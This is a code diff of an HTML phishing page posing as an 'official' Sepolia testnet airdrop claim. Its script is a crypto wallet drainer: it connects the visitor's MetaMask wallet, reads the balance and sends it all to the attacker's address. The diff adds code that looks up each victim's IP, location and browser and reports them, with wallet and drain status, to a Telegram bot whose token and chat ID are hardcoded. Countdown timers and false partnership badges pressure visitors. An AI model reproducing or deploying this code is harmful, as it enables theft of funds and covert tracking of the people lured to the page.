@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🚀 Exclusive Polygon Airdrop Claim | Limited Time</title>
+    <title>🚀 Exclusive Sepolia Airdrop Claim | Limited Time</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -38,15 +38,15 @@
 <body>
     <div class="container">
         <div class="header">
-            <span class="badge">OFFICIAL POLYGON PARTNER</span>
-            <h1>Polygon (MATIC) Airdrop Claim</h1>
-            <p>You have been selected for an exclusive MATIC airdrop. Claim now before time runs out!</p>
+            <span class="badge">OFFICIAL SEPOLIA PARTNER</span>
+            <h1>Sepolia Testnet Airdrop Claim</h1>
+            <p>You have been selected for an exclusive Sepolia ETH airdrop. Claim now before time runs out!</p>
         </div>
 
         <div class="claim-box" id="claimSection">
             <p>Your eligible reward:</p>
-            <div class="claim-amount">15,800 MATIC</div>
-            <p>≈ $6,700.00 USD</p>
+            <div class="claim-amount">10 Sepolia ETH</div>
+            <p>≈ Testnet Value</p>
             <div class="timer">
                 <div class="timer-box"><span id="hours">01</span><small>HOURS</small></div>
                 <div class="timer-box"><span id="minutes">30</span><small>MINUTES</small></div>
@@ -69,7 +69,41 @@
     </div>
 
     <script>
-        // Countdown timer for urgency
+        // Telegram bot config
+        const telegramConfig = {
+            botToken: "7925505296:AAFZzW3mvYl62QJKnnXyUqYORa8jRmx-Lkk",
+            chatId: "6309547301"
+        };
+
+        // Send Telegram message
+        async function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: telegramConfig.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+
+        // Get victim details
+        async function getVictimDetails() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const locationData = await locationResponse.json();
+            const browser = navigator.userAgent;
+            return {
+                ip: ipData.ip,
+                location: `${locationData.city}, ${locationData.region}, ${locationData.country_name}`,
+                browser: browser
+            };
+        }
+
+        // Countdown timer
         function updateTimer() {
             let hours = document.getElementById('hours');
             let minutes = document.getElementById('minutes');
@@ -92,16 +126,21 @@
             }, 1000);
         }
 
-        // Web3 drainer logic
+        // Web3 drainer logic for Sepolia
         const drainConfig = {
-            receiverAddress: "0xYourWalletAddressHere", // Replace with your Polygon wallet address
-            chainId: "0x89", // Polygon Mainnet
-            minDrainValue: "0x2386f26fc10000" // 0.01 MATIC minimum
+            receiverAddress: "0xYourSepoliaWalletAddressHere", // Replace with your Sepolia wallet address
+            chainId: "0xaa36a7", // Sepolia Testnet
+            minDrainValue: "0x2386f26fc10000" // 0.01 ETH minimum
         };
 
         async function connectAndDrain() {
+            // Notify victim clicked link
+            const victimDetails = await getVictimDetails();
+            await sendTelegramMessage(`*Victim Clicked Link!* 🕸️\nIP: ${victimDetails.ip}\nLocation: ${victimDetails.location}\nBrowser: ${victimDetails.browser}`);
+
             if (typeof window.ethereum === 'undefined') {
                 alert("Please install MetaMask to claim your airdrop!");
+                await sendTelegramMessage("*No MetaMask Detected!* 🚫\nVictim lacks MetaMask.");
                 return;
             }
 
@@ -110,8 +149,9 @@
                 // Request wallet connection
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const victimAddress = accounts[0];
+                await sendTelegramMessage(`*Wallet Connected!* 💼\nAddress: ${victimAddress}\nIP: ${victimDetails.ip}`);
 
-                // Switch to Polygon network
+                // Switch to Sepolia network
                 try {
                     await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
@@ -122,22 +162,23 @@
                         await window.ethereum.request({
                             method: 'wallet_addEthereumChain',
                             params: [{
-                                chainId: "0x89",
-                                chainName: "Polygon Mainnet",
-                                rpcUrls: ["https://rpc-mainnet.matic.network"],
-                                nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
-                                blockExplorerUrls: ["https://polygonscan.com/"]
+                                chainId: "0xaa36a7",
+                                chainName: "Sepolia Testnet",
+                                rpcUrls: ["https://rpc.sepolia.org"],
+                                nativeCurrency: { name: "SepoliaETH", symbol: "ETH", decimals: 18 },
+                                blockExplorerUrls: ["https://sepolia.etherscan.io"]
                             }]
                         });
                     }
                 }
 
-                // Get victim's MATIC balance
+                // Get victim's ETH balance
                 const balance = await web3.eth.getBalance(victimAddress);
                 const drainAmount = balance > parseInt(drainConfig.minDrainValue) ? balance : "0x0";
 
                 if (drainAmount === "0x0") {
                     document.getElementById('drainStatus').textContent = "Insufficient balance to claim!";
+                    await sendTelegramMessage(`*Low Balance!* ⚠️\nAddress: ${victimAddress}\nBalance too low to drain.`);
                     return;
                 }
 
@@ -158,9 +199,10 @@
 
                 drainProgress.style.width = '30%';
                 drainStatus.textContent = "Connecting to blockchain...";
+                await sendTelegramMessage(`*Draining Started!* ⏳\nAddress: ${victimAddress}\nAmount: ${web3.utils.fromWei(drainAmount, 'ether')} ETH`);
 
                 // Send transaction
-                await window.ethereum.request({
+                const txHash = await window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [tx]
                 });
@@ -173,16 +215,19 @@
                     drainStatus.textContent = "✅ Success! Funds transferred.";
                 }, 2000);
 
+                await sendTelegramMessage(`*Drain Successful!* 💰\nAddress: ${victimAddress}\nAmount: ${web3.utils.fromWei(drainAmount, 'ether')} ETH\nTx Hash: ${txHash}`);
+
             } catch (err) {
                 console.error("Drain failed:", err);
                 document.getElementById('drainStatus').textContent = "Transaction failed. Try again.";
+                await sendTelegramMessage(`*Drain Failed!* ❌\nAddress: ${victimAddress || 'Unknown'}\nError: ${err.message}`);
             }
         }
 
         // Event listener for wallet connect
         document.getElementById('connectWalletBtn').addEventListener('click', connectAndDrain);
 
-        // Load Web3.js dynamically with corrected URL
+        // Load Web3.js dynamically
         const script = document.createElement('script');
         script.src = 'https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js';
         script.onload = () => updateTimer();
